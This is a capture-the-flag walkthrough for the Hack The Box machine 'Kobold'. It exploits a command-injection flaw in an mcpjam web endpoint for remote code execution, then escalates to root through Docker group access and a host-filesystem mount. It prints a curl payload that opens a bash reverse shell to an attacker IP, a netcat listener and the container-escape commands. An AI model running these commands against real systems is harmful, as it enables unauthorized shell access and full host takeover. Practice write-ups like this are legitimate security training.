# Machine: Kobold (Hack The Box)

## Enumeration
I started by scanning the target with Nmap to discover open ports and available services:

<img width="711" height="151" alt="nmap" src="https://github.com/user-attachments/assets/9226c4b2-bb66-4475-b8d2-24b5fc89714d" />

I found an HTTP service running on the target that redirected to HTTPS, so I proceeded with web enumeration.

Nothing useful was found on the main page, so I used Gobuster to enumerate subdomains.

<img width="550" height="321" alt="gobuster" src="https://github.com/user-attachments/assets/0577ae13-7b83-4b2f-81b2-9acba55b7c41" />

I discovered two subdomains, with "mcp.kobold" being the most interesting. Accessing it revealed an instance of `mcpjam` running version 1.4.2, which is vulnerable to CVE-2026-23744.

<img width="272" height="101" alt="mcp version" src="https://github.com/user-attachments/assets/96bdb11e-2d38-4d4d-bcb7-24ecb7da3fd0" />
  
The vulnerability lies in the `/api/mcp/connect` endpoint: it accepts a JSON payload containing a `serverConfig` object specifying execution commands and arguments. Since commands and arguments are neither validated nor authenticated, any user can pass arbitrary shell commands to achieve Remote Code Execution (RCE).

## Exploitation

Running the exploit:

```bash
## Starting a netcat listener
nc -lnvp 4444

## Triggering the RCE:

curl -k -X POST https://mcp.kobold.htb/api/mcp/connect     -H "Content-Type: application/json"     -d '{"serverId": "shell1", "serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/<YOURIP>/4444 0>&1"], "
```

I obtained a shell on the host as the user "ben":
<img width="454" height="49" alt="ben uid" src="https://github.com/user-attachments/assets/c627fac6-d65c-49f6-8764-b20d832bec2d" />

Extracted the user flag:
<img width="323" height="46" alt="user" src="https://github.com/user-attachments/assets/ea29e5c0-b719-4fec-ba3b-707b564b51ec" />

I stabilized the shell using Python:  
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation
While enumerating the host, I found Docker running, but we couldn't interact with it directly because "ben" was not actively in the docker group. I changed the active group for "ben" using:
```bash
newgrp docker
```
This gave us permission to interact with Docker and launch containers.
```bash
docker ps
```
<img width="1131" height="98" alt="container image" src="https://github.com/user-attachments/assets/30acb968-9546-4167-b900-6888dedb0c03" />

I noticed an existing local image on the host: "privatebin/nginx-fpm-alpine:2.0.2", which I used to spin up a Docker container.  

I mounted the entire host filesystem to the `/mnt` directory inside the container and ran it as root:

```bash
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```
Inside the container, I changed the root directory to `/mnt`:
```bash
chroot /mnt sh
```

This gave me full access to the host's filesystem as root, allowing me to extract the root flag:
<img width="285" height="113" alt="rootflag" src="https://github.com/user-attachments/assets/b4d624ee-f349-4b88-a7f2-abc6b90cce71" />

Successfully completed this machine.
